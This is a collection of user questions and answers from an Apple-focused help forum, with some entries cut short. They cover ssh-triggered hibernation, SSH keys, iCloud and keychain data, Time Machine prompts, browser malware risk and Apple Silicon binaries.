1' \n\nUnfortunately that did not work and I got an error message about stdin not being a terminal.\nBecause I did not only want to be able to hibernate my windows machine but also suspend it, I found the tool psshutdown.exe. I had the same problems that the terminal or the apple script would hang when executing the command over ssh with:\nssh -t phili@192.168.0.11 'psshutdown.exe -h -t 0 -accepteula' \n\nnote: the option -h here is for hibernate.\nAfter playing around with different options I eventually found how I can make it work without hangup:\nssh -t phili@192.168.0.11 'psshutdown.exe -h -t 1 -accepteula' \n\nI simply changed the countdown from 0 seconds (-t 0) to 1 second (-t 1). I guess the extra second allowed the script to terminate before the remote machine would close the connection and make the script hang. This works for both hibernating and suspending the windows computer. For the latter you simply have to exchange -h for -d:\nssh -t phili@192.168.0.11 'psshutdown.exe -d -t 1 -accepteula' \n\nHope this helps anyone else trying to do the same.\n", "Q: How do I stop Focus suggestions and summaries? The Focus feature in iOS seems intended to reduce unwanted or distracting notifications, but by default it provides new notifications of its own: suggestions for starting Focus and summaries of notifications accumulated during Focus. Both of these kinds of notifications arrive at precisely the time they are most annoying, respectively disturbing you just as you are starting an activity during which you are likely to want to be undisturbed, or just as you are concluding an activity during which you are in Focus (generally a moment, such as reviewing a workout, that requires the most focus).\nHow do I disable these Focus suggestions and summaries?\n\nA: Focus tries to learn your daily routines and apply on-device learning to improve its accuracy; it does get a bit annoying when still in this training mode.\nApple does not offer an option in iOS 15.0x to completely disable Focus, but after a few attempts, it should stop trying to ask you to set any modes up.\n", "Q: authorized_keys no longer working under Big Sur I use ~/.ssh/authorized_keys to allow password-less SSH connection between computers. They worked fine under macOS Catalina, but since I upgraded to macOS Big Sur they no longer work. I can log in to the other macOS all right, but I'm always asked for a password. It looks as if the server ignores my authorized_keys file.\nI tried recreating the keys with ssh-keygen, removed the old authorized_keys file and created a new one with ssh-copy-id.

(A user's home may be anywhere, it can be changed with the Directory Utility.) Somehow, the sshd did not like this. I simply moved the home one directory deeper, to /Volumes/Data/username. Problem gone, now I can log in with the authorized keys without password!\n", "Q: Switch Apple subscription payment method I'd like to switch the payment method of my iCloud+ and Apple Music subscription to Apple Pay. It is currently PayPal. I was under the impression that adding Apple Pay to the top of my list with payment methods would make it switch automatically the next billing. But that doesn't seem to be the case. I also cannot remove the PayPal method: \"Unable to Remove. There is an active subscription on this account that requires at least one payment on file.\"\nDo I have to cancel the subscriptions first?\n\nA: I contacted Apple Support, and it turns out I had to add my credit card separately under Settings > [Name] > Payment & Shipping. I was then also able to remove PayPal.\nI assumed this wasn't necessary since the credit card was already added in Apple Pay (the Wallet app). Though this worked for App Store purchases, it apparently does not work for subscriptions.\nOut of curiosity: does anyone actually have a subscription via Apple Pay itself?\n\nA: You don’t need to remove an existing payment method or cancel any existing subscription to make a new payment method the default.\nOn your iPhone, get into Settings -> (your name) -> Payment & Shipping and tap Edit. Than move the order icon (three parallel bars) for your preferred payment method to the top.\nYou can find more information on adding or removing payment methods through various Apple devices on this Apple support page.\n", "Q: Daisy chain Dell with DisplayPort (output) to Apple Thunderbolt Display I have a Dell P2720DC and Apple Thunderbolt Displays I want to daisy chain.

Which cable/adaptor to use?\nIf not, are there other options?\n\nA: No, this won’t work in a daisy chain situation.\n\n*\n\n*Are there adapters to use Thunderbolt Display with non-Thunderbolt computers?\nHow many Thunderbolt ports does your MacBook have?\nPerhaps a Thunderbolt dock is what you need? The ones from caldigit are superb and give a lot of value for the price.\n", "Q: I uninstalled and reinstalled Uber, how does it still know who I am? I had uninstalled the Uber app on my iPhone. I do not have Uber Eats or another app install which appears to be related to Uber.\nAlso, I do NOT use iCloud.\nToday I reinstalled Uber and found I am fully logged in.\nBy what mechanism specifically did Uber persist my account information while the app was uninstalled?\n\nA: Another possibility is the iOS keychain. Apps can create entries in the keychain which persist after the app is deleted. Unfortunately, there is no supported way to purge this information (beyond resetting the device).\nKeychain entries may also be app group entries, which may be set/cleared by multiple apps provided by the same developer.\nApp developers are forbidden from reading the imei on iOS.\n", "Q: Are there risks when running `sudo xattr -rd com.apple.quarantine \"/Applications/*.app\" `?

If you are concerned about the security of the application you should not do this.\n", "Q: Is it normal for MacBook M1 battery to lose charge when connected to power? I have a MacBook M1 that's only about two months old. I keep it connected to power all the time, and use it in clamshell mode so it's rarely powering the display.\nThe battery level dropped to about 85%, and it has been staying around there consistently. If I turn off \"Optimized battery charging\" it will return to 100%, but when I turn that off it drops again.\nBut I wonder why the charge is dropping in the first place. If it's always connected to power, it shouldn't use the battery at all, right?\nThe caption below the \"Optimized barry charging\" checkbox says\n\nTo reduce battery aging, your Mac learns from your daily charging routine so it can wait to finish charging past 80% until you need to use it on battery.\n\nDoes this mean that it's preferred to keep the battery around 80% when it's not using the battery? And since I never \"need to use it on battery\" it has learned this routine and keeps it there?\nUPDATE:\nI upgraded to Monterey 2 weeks ago. Now it hovers around 72%.\n\nA: If the power adaptor cannot cover the load then the difference is taken from the battery.\nOnce the load is reduced then the battery gets recharged.\nSeen that on my macbook pro and it also depends on the size of the charger. So I can use a 65W charger and see that behavior, but when I connect my 85W charger it rarely happens.\n", "Q: Cycle through ALL open windows in ALL open applications? (keyboard shortcut?)

Could you help me please.\n\nA: First off, welcome to the practice of being a developer and the time honored practice of asking for volunteer help to learn the craft.\nYou can do two things here:\n\n*\n\n*Act as a customer and get support from Apple Developer team to update and resolve the Xcode crash (run updates, open a ticket, restart and try making a more simple document in the app that crashes hoping to discover and isolate the MCVE to cause Xcode to crash).\n\n*Act as a developer and dig in to analyze exactly what happened and grow your skill at reading crash and system logs on macOS.\n\nIf you choose 2 here is the best place to start down that learning path:\n\n*\n\n*https://developer.apple.com/documentation/xcode/diagnosing-issues-using-crash-reports-and-device-logs\nYou have all the tools to start inspecting and debugging this save the source code for Xcode itself but you can decompile that if needed, it just takes time and experience.\n", "Q: Can Macs get a virus just by opening a website? I'm being stupid & anxious, but I need confirmation. I was navigating to a domain, and accidentally messed up the spelling, and it redirected me to an IP address and a fake Apple ID sign in came up, with a pop-up apparently scanning the Mac for viruses.\nOf course, I know it's a fake scan. Of course, I know it's not an official site.\nThat's not what I'm asking, I want to know if I can get a virus on my Mac just by opening that site. I closed the tab 5 seconds after it redirected & I didn't enter anything into the text fields.\n[MacBook Pro M1, Safari 15, macOS Big Sur]\n\nA: Yes, it's possible.\nWhenever you browse a web site, your browsing software sends a User-Agent field saying which browser it is.*  A topical example is:\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)\n       AppleWebKit/601.3.9 (KHTML, like Gecko) \n       Version/9.0.2 Safari/601.3.9\n\nThis shows the browser is Safari and which version, and that the OS is 10.11.  Now, that is powerful information. Because the hacker (or more likely, their malware vendor) has a catalog of which exploits work on which OS and which browser. And so they return a page with one or more of the exploits that work against you, IF ANY.\nFor instance when I hunted these pages for a living, I used a current level Mac and they didn't have any exploits for that.  So they would \"punt\" and serve me \"monetization of last resort\": paid search results (like on a parked domain), or often even a blank page.\nThey've upped their game.  Now, they are now offering social exploits.  They returned a fake Apple login because your User-Agent said you were on a Mac.\nAnyway, the answer to your question is \"yes, possibly\".  You are in the middle of a race between the black-hats who find exploits, and the white-hats and engineers who patch exploits.\nI would note that most browsers give you an option to change the User-Agent to anything you want. Using another platform/browser's agent would cause such sites to throw the wrong exploits at you... but that could cause other weirdnesses on legit sites.\n\n* The legitimate uses of this are customizing web content for browser capability (e.g. deploying Windows-Only features or HTML5 \"web app\" features when the browser can handle it; and taking a census of active site users so they can map the money they make from each user vs the browsers they use.  so they don't accidentally drop support for their highest rollers.  Honestly, not sending User-Agent at all would be a huge boon for security, but the money-biz people would complain, and guess who wins that one.\n\nA: If there was an exploit in Safari then yes, there could be a chance you could get a virus just from clicking onto a website. However, these exploits are generally patched very quickly, aren't that common, and these type of scam websites generally aren't sophisticated enough to do something involving them.\n", "Q: Contextual key mappings in PyCharm on macOS For years I've been using a keymap (IIRC carried over from Visual Studio circa 2005) where F5 is the same key for \"debug...\" and \"resume program\". However while setting up my latest installation on macOS, setting both actions to F5 only brings up the \"debug...\" menu instead of resuming the program. How can I configure pycharm to use the same key for \"debug...\" when no program is running and \"resume program\" when a program is running?\nIs there an existing keymap that has this set? I can't seem to find the built-in or downloaded keymap I was using on my previous setup but I don't think I customized any of the mappings. Pycharm version 2021.2.2 Professional.\n\nA: I discovered the answer by accident. It turns out that if you assign F5 to Resume Program, by default it brings up the same menu as debug.... My issue was that by assigning both to F5, the Resume Program function was being overridden while in a debug or run state.\n", "Q: Disable FN/language and Lock buttons on Mac OSX How can I disable on the Apple Magic Keyboard the :\n\n*\n\n*lock button (above the Delete) : i press it accidentally sometimes and the computer instantly locks\n\n*the FN button's Input source switch functionality (has a globe icon)\n\nThanks !\n\nA: Notice \"globe\" sign in:\nSystem Preferences → Keyboard → Keyboard - this is your \"double fn\".\n\n\nA: Disabling the lock key\nI'm not certain that this is possible, but there are two potential approaches you can try pursuing to achieve this.\nKarabiner-Elements\nThe preferred approach would be to use Karabiner-Elements to rebind that key.

Morning I've been able to work on him like everyday, then I closed the lid to do some other stuff. When I opened it back, it was turned off.\nIn this point I have to admit that I encountered that before, but restarting one or couple times always solved thing. Well, now it didn't. Everytime I could see only question mark folder.\nSo far here's what I did after that:\n\n*\n\n*Standard procedure of resetting SMC and PRAM/NVRAM\n\n*Holding power key for longer time\n\n*Finally booting up in recovery mode (Command + R)\n\nAnd to be honest real problem starts now.\nI booted up to Mavericks recovery (which is default for my Mid 2014), but I wasn't able to see my disk during reinstallation of MacOS. I went to disk utility then I noticed only \"disk0\" with description of \"Base OS X System\".\nWell, first thought - SSD is dead BUT... I'm using adapter connected to my Macbook and NVME M.2 SSD attached to adapter. I found on internet that Mavericks disk utility is not able to see this kind of drive, so next thought - let's try newest disk utility via internet recovery.\nInstead of hitting Command + R I tried Command + Alt/Option + R. It is important to let you know, that I used internet recovery successfully, when I installed lastest OS on my Macbook (a year ago). However in this point recovery failed to boot (after providing WiFi and waiting couple of minutes) with error -0000F < it's not code of error, but everytime I try to use recovery I receive different numbers. For now it's -2005F with triangle and exclamation mark on globe.\nWell, then I hitted another SMC + PRAM/NVRAM clear and tried again. Same error. Things gets spicy, because now I can't even access internal recovery (Command + R).\nSummary in current point:\n\n*\n\n*I'm not able to access any recovery (always get some error).\n\n*I'm not able to boot up Macbook (gets black screen or after clearing PRAM/NVRAM - again question mark folder)\n\nWhat I tried to do after those steps:\n\n*\n\n*Connect WiFi from drive menu, where I also didn't noticed any disk (holding Alt/Option after chime sound)\n\n*Couple of SMC and PRAM/NVRAM clears\n\n*Holding power button for so long.\n\n*Trying steps with connected and disconnected MagSafe.\n\n*Clearing adapter and SSD from dust.\n\nWhat are possibilities in my opinion:\n\n*\n\n*SSD or apdater is dead (or both), but I can't check it - I don't have other suitable device.\n\n*Everything with hardware is fine, but Mavericks just wasn't able to see my disk (I wish)\n\n*More deep problem. (Unfortunately most probable)\n\nSo... Any ideas? I can try to create bootable USB from Windows machine, but I don't know if it is even worth.

Also, you should reset your device in safe mode setting because if someone has your account set as a supervised account or kids/monitored account, it will resolve their connection to your device. There’s accessibility settings that toggles with switch control. Then, you could tell them good luck remote controlling that one!

I fully uninstalled Divvy then re-installed it in the process and still got the same issue.\nWhat is going on? Is this a symptom of a bad macOS configuration on my end or a change in how events are managed in the OS? Outdated applications?\n\nA: As often with StackExchange, I found and solved the issue shortly after asking the question!\n\n*\n\n*I have a broken version of aText from June 2021 that stopped auto-updating\n\n*Running a Divvy or Rectangle \"global\" shortcut would be intercepted by aText (so not triggering the window management action) then kill aText, as observed using Activity Monitor\n\n*I'd have to re-run the window management shortcut for it to reach Divvy, now that aText wasn't running (\"launching\" Divvy was just a placebo)\n\n*I'd have to re-launch aText for it to be able to expand text\n\nI manually downloaded the latest aText version and everything works just like before June 2021.\n", "Q: How do I reset my network if I don't have a SystemConfiguration folder?

Here it shows me an old email address.\nSomewhere on my iPhone or in my iCloud there is Microsoft data hiding - which I don't like. I've removed all the Microsoft apps from backups on all my devices, and uninstalled & reinstalled Microsoft Lens using the method described here: https://discussions.apple.com/thread/250190465. But it still knows my email address.\nWhereabouts its it getting this information from and how can I delete it?\n\nA: The account information is most probably stored in the Keychain on the phone.\nUnfortunately there's no user interface provided for the Keychain beyond what the individual app developer (such as Microsoft) provided with the app.\nThis means that if the app does not provide an option to delete the data, your only choice is to erase the whole Keychain (and thus the whole phone). There's no possibility of erasing just a single item in the Keychain.\n", "Q: Confusion about syntax for notarizing an app using xcrun altool I'm trying to obtain notarization for an app I developed outside Xcode but instead wrote using python and pyinstaller and that I wish to share outside the app store.

How can I troubleshoot? I got my AirPods Pro new four months ago. They worked great until last night. I used them yesterday morning. When I finished the case and the pods were each about half charged. I left them by my bed all day, not plugged in to charge, but with the pods in the case and the case closed normally.\nI went to use them last night and they acted completely dead. The LED won't light in any circumstances. I open the case and my phone doesn't pop up the battery indicator. I put them in my ears and they make no sound. I hold down the pairing button on the back and they won't pair with other bluetooth devices or respond to other bluetooth devices they are already paired with. They won't respond to my iPad that they were paired with either. Completely dead.\nI spent most of the day yesterday with my phone about ten feet from the AirPods Pro. I got and installed the iOS 15.0.1 update on my iPhone 12 Pro at some point during the day yesterday. It seems to work fine. I noted last night that a new AirPods Pro firmware update was released day before yesterday. I believe that the firmware update, or possibly the iOS update, somehow bricked my AirPods. I can't think of any other possible thing that would make them suddenly stop working without anything physical happening to them.\nLast night I plugged them in to charge. I confirmed that the charging wire was working by plugging it into my phone first. After a few minutes the AirPods felt a bit warm to the touch in the bottom middle. I assume this was the battery charging. This morning they still felt warm to the touch. I think this is a bad sign. It doesn't take eight hours to charge the batteries. They are still totally unresponsive.\nI tried the reset procedure (https://support.apple.com/en-us/HT209463), but no luck. I noted that my iPhone and iPad still report the firmware version as 3E751, not the new 4A400, before I did Forget This Device.\nIs there anything I can try on my own before calling Apple to get these replaced?\n\nA: These are so small, I would research the steps (you did well) and then open a support case. There’s not much cost benefit to a repair versus a new purchase, but I think Apple might do a better job recycling than I can so I try to get repair parts personally until the new model is substantially better functionality.\n", "Q: DefaultKeyBinding.dict method not working to move cursor from word to word(which is by default options + left/right) I created a DefaultKeyBinding.dict in ~/Library/KeyBindings and copied this code to change how I can move from words to words to command+left/right instead of options + left/right.

What I do see there are commands such as moveWordForward moveWordBackward. I don't find moveWordLeftAndModifySelection, and I don't know what you want to achieve with it, but maybe the Cocoa Events Handling Guide (the link of which I provide above) can help you.\n\nA: I used Karabiner and used a rule set https://ke-complex-modifications.pqrs.org/?q=finder%20search#:~:text=Windows%20shortcuts%20on-,macOS,-Import to make it more like Windows.\nIt is perfect except one issue.

In fact, if it's a requirement, I might as well forget about this whole thing.\nIs it a requirement? Or am I allowed to use what I already know, meaning \"web technologies\"? And if I'm allowed to, does it come with some kind of punishment/downside? Will my app be labeled as \"lesser\", and/or will it run poorly on iPhones and in practice force me to learn and use Apple's language/environment after all?\n\nA: No, iOS apps can be written in just about any language, as long as you can get it to work on the iPhone. You might have to wrap your code in Objective-C or Swift at the very end, but you could build the vast majority of your app in any language without any sort of penalty or punishment.\n", "Q: Cannot connect to my Google accounts anymore I'm on macOS 10.13.6 and Mail just started to prompt me to authenticate to connet to my two gmail accounts.

Unix systems in their early days originally outputted to physical teletypewriters. Since macOS is a Unix system and is derived from NeXTSTEP and BSD, is this still possible in modern versions of macOS?\n\nA: The term \"physical terminal\" and \"teletypewriter\" is quite broad. You're talking products evolved over decades - and thus varying in hardware, functionality, etc.\nIf you're asking whether you can take an old teletypewriter from the 60's or 70's and hook it up directly to your modern Mac - then the answer is no. Macs (as well as common, modern PCs) simply do not have the hardware interface for connecting to that machinery. Depending on the model of teletypewriter, the hardware interface can vary from very exotic circuits to something resembling an RS-232 serial interface.\nHowever, if you can add some modern electronics and are willing to add or reconfigure software - then yes, it is definitely possible. It doesn't really have much to do with macOS being derived from NeXTSTEP or BSD though - as you could do the same on Linux or Windows for that matter.\nHave a look at for example this fun hobby project connecting a really old teletype to a modern computer using a custom developed USB interface:\nhttps://www.pjrc.com/teletype-usb-interface/\n\nA: You might find this helpful:\nhttp://www.club.cc.cmu.edu/~mdille3/doc/mac_osx_serial_console.html\nhttps://superuser.com/questions/1059744/serial-console-login-on-osx\nMost of the rest of the links I found are quite old.\n", "Q: Can I generate redemption code in Apple Business Manager for my own app?

This mean more scrolling is needed to reach certain information.\nCan it be switched to the old look or an equivalent compact layout on an iPhone size display ?\n\nA: No, Apple doesn't offer a way to customize the Weather app (except for choosing a city to display).\nI'm extremely disappointed by this because there's some info that people in California, who coded the app, might want to see at the top, like Air Quality, that I couldn't care less about.\nThere's many different 3rd-party apps that provide a myriad of different layouts and you might find those more to your liking.\n", "Q: Possible to prevent iPhone from automatically joining known networks? The Wi-Fi settings description of \"Ask to Join Networks\" says \"Known networks will be joined automatically...\". That \"feature\" is causing me problems.\nI have a local wi-fi router in my home office which is above the garage and far from the family room at the other end of the house, where there's another wi-fi network with a different name. If I ever leave my office and walk towards the family room, my iPhone jumps to the family-room network but it doesn't jump back on to my office wifi network when I return to my computer. When I'm in my office, the reception for the FamilyRoomNetwork is very weak and it is very slow.\nCan this be fixed, either by causing an automatic rejoin of my office wifi network when I return to my desk or by forcing the phone to ask my permission to switch to another known network?\nP.S.

This machine is named \"Data\". I then made a Time Machine Backup on that drive.\nI made that Mini a backup server, by selecting it in System Preferences —> Sharing —> File Sharing, then using Control-Click on the 8TB drive to see the hidden menu, picking \"Advanced Options\", and clicking \"Share as a Time Machine backup destination.\"\nI then began backing up two other machines to this drive, \"Create\", and \"Web\".\nThe local backup finished, an hour went by, and Time Machine tried to do a second backup, but halted with the message:\nWould you like this computer to inherit the backup history from “Web” on the “8TB” backup disk? The backup was created on a different computer. If you inherit this backup, it can no longer be used by the original computer.\nThat dialogue has three buttons: \"Don't Back Up Now\", \"Create New Backup\", and \"Inherit Backup History\". I don't want any of those options!\nThe drive \"8TB\" has the following root level contents, as expected: folder \"Backups.backupdb\", and two disk images, \"Create.sparsebundle\" and \"Web.sparsebundle\".\nSo, what do I do? I obviously don't want to use the \"Web\" machine backup on the \"Data\" machine, but it seemingly doesn't understand it has its own backup.\nUPDATE: \"Create\" is still running its base backup, so I don't want to do anything to disturb that. So on the machine physically connected to the backup disk (Data), I chose \"Create New Backup\" on the popup, and it successfully did an incremental backup!\nSo I waited an hour, and the same annoying popup happened. I chose \"Create New Backup\" again, and it created another incremental backup.\nI logged out and closed Screen Sharing and left it overnight, and no new backups appeared — which is wrong, as this is a MySQL server driving a public-facing website, and I'm certain at least some of the MySQL table files had changed. (Logs confirm that.)\nI logged in to Data, opened the Time Machine System Preference, waited for the next backup to happen, and then got the same stupid dialogue.\nSurely, there's some .plist or system default or something I can change to get rid of this STUPID, USELESS dialogue? I want automatic backups without having to click \"Create New Backup\" every time!\n\nA: I'm not sure why such behavior is occurring, but splitting the drive into 2 volumes should almost definitely fix the issue (with almost no drawbacks due to how APFS splits volumes). To fix this issue, use disk utility to add another volume to the APFS container (this has the advantage that, unlike a partition, division of space flexible). Then share both of these and use one volume per computer.\n\nA: This didn't come up on my first search here, but I found a tour-de-force for problems associating backups, devices, and hosts: Inheriting Time Machine Backup: Invalid Target\nIn reading that, I realized that I had done a brain-transplant on this machine when another Mac Mini died. The dead one was my database server, and the one I moved the hard disk to was \"Web.\" According to 1, backups are associated with MAC addresses on machines, so of course, for the purpose of backup, this machine thinks it is \"Web\" and so insists on using the existing backups for Web.\nI haven't yet solved the problem, with with the help of 1, I think I know how to do so. It involves editing /Library/Preferences/com.apple.TimeMachine.plist to change the association between MAC address (\"HostUUID\")and the proper backup location.\nAAARRRGGGHHH!!!

I decided to stop the file transfer and try again. However, when I tried to stop the transfer anything connected to Finder disappeared - e.g. all icons on my desktop. Other programmes were still working, so I decided to quit everything while I could and reboot. However, this seems to have corrupted the external hard drive. I tried plugging it back in and it couldn't be mounted anymore. I tried it on a different MacBook Pro, and started running first aid from the disk utility. It was all going fine, but it is now at the \"Checking catalog file\" stage, and has completely frozen the Macbook. The colorful wheel just keeps spinning and nothing is responding.\nWhat should I do to avoid further damage? Just wait?\n\nA: *\n\n*If your drive is formatted HFS+, try DiskWarrior.\n\n*If #1 does not help: In the unlikely event that the root cause of the failure lies in the drive controller/interface, rather than data corruption on the drive itself, you may wish to buy an empty HDD enclosure and try moving the physical drive into it.\n\n*If #1 and #2 fail or do not apply, you'll need to erase your drive and restore your data from a backup.\n\n*If all of the above fail, you have no backup and your data is worth the cost, use a professional data recovery service.\n\nWhatever you do, try to minimize the amount of time that the damaged drive is connected to power in order to reduce the chance for further corruption.\n", "Q: Can't codesign due to \" .DS_Store files cannot be a symlink\" I'm trying to get an app notarized, which was written in python and converted to an .app using pyinstaller.

Is it even possible?  Will I somehow bork my system if I try it with sudo?\nUpdate\nI'm not asking how to create a symlink.  That can be boiled down to\nsudo ln -s \"$HOME/Library/Mobile Documents/com~apple~CloudDocs\" /Volumes/iCloud\n\nbut it leaves all of the app-specific folders out, because  $HOME/Library/Mobile Documents/com~apple~CloudDocs only includes folders and files that you created in the root of the iCloud Drive.  All the nifty folders with app icons on them are not there, but instead have equally obscure names up a level in $HOME/Library/Mobile Documents.\n\nA: Symlinks is the way to go, but it took me several tries to work out the kinks, probably due to the spaces Apple insists on putting everywhere in the directory names and how complicated the cloud drive path is.\nOpen Finder on iCloud Drive and pick a file.\nRight click, press ⌥ (option) key and choose Copy <filename> as Pathname.\nNow you have the full file path in your clipboard.\nIn my case, I took a file called diagram.svg in the root of my documents.\nOpen a Terminal (I did this with Kitty + zsh, but don't see why iTerm2 or Terminal would not work with bash or zsh).\ncd home and Paste your file name.

If I select multiple photos and try to delete them, it works a bit but only like 10% of the photos I selected got deleted. What's going on? It takes me forever to select and delete hundreds of photos only to find out it didn't delete everything I had selected.\n\nHow am I supposed to delete my iMessage attachments en masse in order to free up iCloud stoage space? Am I doing something wrong?\nI'm thinking maybe I have to disable messages in iCloud to force delete everything from iCloud but then I'm worried I might lose everything. I would do this if disabling messages in iCloud would make my phone download all messages and attachments from iCloud to my phone first, but I'm not sure if that's what will happen.\nAnother quirk: Open Settings > General > iPhone Storage > Messages > Other is using 500MB but if I open it I get a blank screen. What's that 500MB supposed to be? Videos and GIFs and Stickers is using a non-zero amount of storage but they're empty too when I open it.\nI have 3 devices all linked to the same iCloud account: iPhone, iPad and Macbook. I'm not sure if that's an issue. I assumed if I delete an attachment from one device then it should delete from the others too.\nOn my Macbook I can try to bulk delete photos in a similar way, but it's more tedious and still doesn't really delete anything. Ditto my iPad.\n\nA: I don’t think you’re doing anything wrong and think there is a/several bug(s) in code and possibly errors in your cloud-synced database that stores these message and attachment data.\nIf so, the repair of this damage / data inconsistency likely requires assistance Apple Engineers or support. Even if there was a bulk or automated deletion, clearing more than one media or file attachment selection at a time if you want to retain any of the conversation text is problematic at best.\nIn the past I followed this procedure and ended up with a worse situation, the photos “deleted” from the conversation, but still took up cloud or device space. Yours is also frustrating in that you can’t free local space or visually clean up the message the conversations.\nIf you don’t want to engage with support, you might be able to solve this by disabling (or enabling cloud sync of messages in settings and check other devices that participate in iCloud sync for messages against your AppleID.\nIn the absence of apple coding in repair and healing of this so t “it just works”, it would be nice to have a “repair” option we could engage to fix this.

It was apparently caused by old software and plist settings left over from multiple migration of my account across machines and OS updates. I spent a lot of time trying to resolve it. Based on my experience, you COULD go digging through your profile settings trying to resolve your issue, but at some point it isn't worth your time - it will be more effective and much faster to simply recreate your profile.\n\nA: This is typically enforced via a profile in system settings.

After some research, I found that it uses low energy bluetooth to discover other devices and establish a WiFi connection. However, when you are already connected to a WiFi network, will it temporarily disconnect or are Apple devices able to establish the temporary file exchange network in parallel? How would it be possible? Can a single WiFi card establish multiple WiFi connections or do they use an extra/special WiFi card in their devices?\n\nA: Yes, supported Apple devices are able to be connected to a WiFi network (i.e. an access point) and communicating via this \"temporary\" peer-to-peer network simultaneously. The protocol that is used is called AWDL (Apple Wireless Direct Link).\nA single WiFi \"card\" can do this, yes - you do not need two WiFi \"cards\".\nI would say that Apple popularized this type of connectivity, but today it is also possible to do something similar on non-Apple systems. I.e. this is not dependent on some special \"Apple WiFi chip\". The most direct comparison is the WiFi Direct feature found on other systems (for example Android phones, Windows laptops, etc). Some WiFi chipsets supports WiFi Direct while simultaneously being connected to an access points - others do not.\n", "Q: Why are apps divided into Intel or M1 based types if universal binaries exist? So, I am downloading software in preparation for a M1 Macbook and I have quickly discovered that sites will often ask what type of mac chip you have along with an article showing how.\nOn average, most sites (like VLC) I've seen will often have you pick from one of these options:\n\n*\n\n*Intel-based\n\n*M1 Chip\n\n*Universal Binary\n\nThe main question I have is why do these sites separate their apps into the two categories based off of your chip type if they can just push out universal binaries?\nOther questions that stem from this are pretty much around why does this app only supports X chip types? - Somewhat similar to saying 'This program is designed to work on AMD cpus but not Intel cpus.'\n\nA: \nThe main question I have is why do these sites separate their apps into the two categories based off of your chip type if they can just push out universal binaries?\n\nWhile it is a easy (and recommended by Apple) way, it increases the size of the program. Because it is actually both of the installers under a single wrapper.\n\nOther questions that stem from this are pretty much around why does this app only supports X chip types? - Somewhat similar to saying 'This program is designed to work on AMD cpus but not Intel cpus.'\n\nThe comparison of AMD and Intel and Intel and M1 is between Red Delicious and Golden Delicious and Apple and Orange. What Apple say to be Intel is actually x86 ( amd64/x86-64 to be precise) ISA. AMD and Intel are just different manufacturers. Only programs to claim support for one if it is something to do with chipset or such low-level vendor-depndent harware part or vendor developed  features (3DNow!, AMD-V, Vt-x). There are many hackintosh in the wild running on AMD. M1, on the other hand, is designed by Apple in-house, based on ARM ISA. So, they are incompatible. They does things differently at machine code level.\n\nA: My experience is that VLC is an outlier: most developers produce one Universal Binary app for both architectures, and that's what Apple recommends.\nThe only benefit to the user is one of file size. A Universal Binary contains 'the other' binary that your hardware can't use, so it's going to be around twice the size that you need.\nThere's more work for the developer in maintaining separate builds. However, it's possible that cross-platform software (written for Windows, Linuxes and MacOS) has systems in place to handle producing different builds from the same code, so they're geared up to do that anyway.\nUltimately, why a dev does something is a question only they can answer.\n\nA: The answer is very simple and straightforward. Network transfer size, and hard-drive footprint.\nA Universal binary contains BOTH executable code (machine language) for the M1 processor, and for the intel X86-64 processor. This means that the overall app \"bundle\" will weigh much more. Most resources of an app will only need to appear once - (UI definitions, Images, Sounds, icons etc.) but the actual executable code - will be twice as large.\nFor big applications like VLC or Google-Chrome - this means tens to hundreds of megabytes extra.\nWe also remember that we're in the SSD era, and most Macs (especially low-end MacBooks) only sport 256GB to 1TB internal drive. Accumulating apps make a big difference.\nSo - thinking about download time and network transfer quotas (which cost the software supplier), and caring that on a users drive the apps won't take up too much -\nMany software distributors offer the choice between Universal, intel-only and M1-only builds of the same apps.\nIt's as simple as that. Download what fits you, your Mac and your hard drive...\n\nA: Developers could only distribute universal binaries, but that might make life more difficult for superusers and system administrators who want to install the software, for example, on a fleet of Intel-based Macs without having to download two binaries (although they are packaged into one).\nSome apps only support certain chip types because of how they are built/compiled. When someone writes the code for an application, they use a compiler to translate the high-level (human-readable) code into low-level, binary (ones and zeros) instructions that the computer can understand. Because different CPUs (e.g., AMD vs. ARM—M1 is an ARM chip) use different sequences of ones and zeros for the same actions, the same binary code will not work across all systems. To give a very oversimplified example (this is not actually how it works, and the binary numbers that I used are made up, but it illustrates the concept), an ARM CPU might interpret the instruction 10011100 as a command to write to RAM, but an Intel CPU might use the instruction 10001111 to write to RAM. If you feed an Intel CPU the instruction for the ARM CPU (10011100), it will probably perform an entirely different task. If the processor isn't doing what the compiler intended, then the app won't work.\nTo make apps work across multiple chip architectures, you need to compile separate binaries for each architecture (as each one has its own instruction set). This is why you are seeing the three options on some of the sites you visit.\n", "Q: Import list of songs into Apple Music Import list of songs into Apple Music\n\nContext:\n\nEssentially, I've been writing down a list of songs in my note app on my Macbook Pro (more specifically, OneNote) which I like - just the name, because usually I'll know the artist and recognise the song based on the name. It's something like 100 songs long.\nI just got Apple Music, and I want to create a huge playlist with all the songs on the list - only I don't want to add them one at a time.\n\nQuestion:\n\nIs there some way I can import a list of song names into Apple Music and mass add them into one playlist as opposed to individually adding them? Some way for apple music to recognise the song and add it?\n\nA: Apple Music import expects a structured list with a key that matches your song with the geographic region in which you are licensed to play the content. (The song is licensed and identified differently in the 150 or so “stores” …)\nIf typing them is slow for you in Apple Music, you could enable Siri and use that to add three of the songs to a playlist:\n\n*\n\n*Hey Siri, play Dissolved by Jimanica\n\n*Hey Siri, play Wrinkle by Miles Davis\n\n*Hey Siri, play Vitamin C by Can\n\nIf you get the correct version of the correct song (unlikely with Jimanica, lots of versions of wrinkle but the last should work easily), next use Siri to add these to your playlist. You will need to create this playlist before Siri can add a track.\n\n*\n\n*Hey Siri, add this to my huge playlist\n\nOnce you have three songs, you can export that not yet huge playlist to a text file and check out the data structure.\nWhatever tool or automation or service you use will need to make up all those details for the import or selection to work.\nMy hunch is you’ll want to chip away at these by hand and won’t save any time automating it, but perhaps your diction or songs are easier to add then mine. I use Siri to add these songs to my “second listen” playlist as I find them rather than dump it to a text file / note since it’s faster for me than trying to import them later.\n", "Q: Tab completion in bash for definition of bash functions?

